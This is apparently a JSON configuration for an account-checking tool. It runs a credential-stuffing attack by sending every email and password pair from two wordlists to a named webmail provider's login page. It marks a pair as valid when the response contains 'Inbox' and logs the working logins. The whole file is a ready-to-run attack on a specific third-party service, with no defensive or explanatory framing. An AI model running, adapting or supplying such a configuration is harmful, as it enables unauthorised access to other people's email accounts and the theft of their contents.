{
  "Settings": {
    "BlockSettings": {
      "MaxRetries": 2,
      "Timeout": 10
    }
  },
  "Lists": {
    "EMAILS": {
      "Type": "Text",
      "Path": "wordlists/emails.txt"
    },
    "PASSWORDS": {
      "Type": "Text",
      "Path": "wordlists/passwords.txt"
    }
  },
  "Flow": [
    {
      "Type": "Request",
      "Method": "POST",
      "Url": "https://webmail.au.syrahost.com/login.php",
      "Headers": {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      "Body": "username=<EMAILS>&password=<PASSWORDS>",
      "Parse": {
        "Success": {
          "Type": "Contains",
          "Value": "Inbox"
        }
      }
    },
    {
      "Type": "Condition",
      "If": "Success",
      "Then": [
        {
          "Type": "Log",
          "Message": "[VALID] <EMAILS>:<PASSWORDS>"
        }
      ],
      "Else": [
        {
          "Type": "Log",
          "Message": "[INVALID] <EMAILS>:<PASSWORDS>"
        }
      ]
    }
  ]
}
